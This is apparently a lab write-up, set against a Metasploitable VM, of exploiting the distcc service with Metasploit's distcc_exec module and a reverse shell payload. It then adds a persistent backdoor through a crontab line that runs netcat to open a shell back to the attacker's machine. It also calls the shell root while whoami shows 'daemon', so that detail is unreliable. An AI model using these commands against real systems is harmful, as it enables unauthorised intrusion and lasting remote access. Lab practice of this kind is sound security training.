# Exploiting `distcc`


## Metasploit Method

### Reconnaissance
- Netdiscover to identify IP Address of Metasploitable (Target) VM 
- A bash script running nmap scans to identify: 
    - Open Ports 
    - Services 
    - Versions 
    - Operating System

- Identified Port 3632 is open and running distcc which is vulnerable to Command Execution 

### Weaponization
- Used Metasploit Framework to automate the exploit 
- The exploit used is distcc_exec 
- Metaploit path is `exploit/unix/misc/distcc_exec`

```bash 
msfconsole 
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.56.105 # Target IP
set LHOSTS 192.168.56.106 # Kali IP
set PAYLOAD cmd/unix/reverse
```

### Delivery

- Ran the exploit 

```bash 
run 
```

### Exploitation 

The exploit grants us a root terminal shell 
This can be determined used `whoami` which returns `daemon`

### Installation 
- Created a cronjob that connects back to Kali machine with shell access 

```bash 
echo "* * * * * nc -e /bin/bash <kali_ip> 4444" >> /etc/crontab
```

### Command And Control 
- Even after the Metasploitable machine is rebooted the cronjob will attempt to connect back to the listener 

### Actions On Objectives 

- Exploitation was achieved 
- A persistent backdoor was created 